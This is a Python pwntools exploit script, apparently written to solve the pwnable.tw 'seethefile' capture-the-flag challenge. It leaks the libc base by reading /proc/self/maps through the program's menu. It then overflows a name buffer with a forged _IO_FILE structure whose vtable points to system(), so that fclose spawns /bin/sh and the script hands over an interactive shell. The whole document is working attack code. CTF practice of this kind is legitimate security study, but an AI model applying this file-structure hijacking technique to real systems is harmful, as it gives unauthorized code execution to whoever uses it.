#!/usr/bin/env python3
from pwn import *
from sys import argv
context.arch = 'i386'
binary = ELF('seethefile', checksec=0)
libc = ELF('libc_32.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10200)
else:
  p = binary.process(env={'LD_PRELOAD': 'libc_32.so.6'})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

def option_open(path : str):
  log.info(f"open({path})")
  sl(b'1', b'choice :')
  sl(path, b'see :')

def option_read():
  log.info("read()")
  sl(b'2', b'choice :')

def option_write():
  log.info("write()")
  sl(b'3', b'choice :')

def option_close():
  log.info("close()")
  sl(b'4', b'choice :')

def option_exit():
  log.info("exit()")
  sl(b'5', b'choice :')


menu = b'---------------MENU---------------'
offset = 32
name_ptr = 0x804b260

pause()
option_open(b'/proc/self/maps')
option_read()
option_read()
option_write()
p.recvline()
libc_leak = int(p.recv(8), 16)
system_addr = libc_leak + libc.symbols['system']
log.info("Leaked libc base address: %#lx" % libc_leak)
log.info("Leaked system address: %#lx" % system_addr)

fp = FileStructure()
fp.flags = b'/bin'
fp._IO_read_ptr = b'/sh\x00'
fp._lock = 0x804b400        # valid address eval to NULL (as to not lock)
fp.vtable = (0x804b284 + 0x98) - 4*17 # calculate vtable address

payload = b'A'*offset       # offset
payload += p32(0x804b284)   # fake _IO_FILE structure
payload += bytes(fp)
payload += p32(system_addr) # vtable fclose(fp)

option_exit()
p.sendline(payload)
p.interactive()
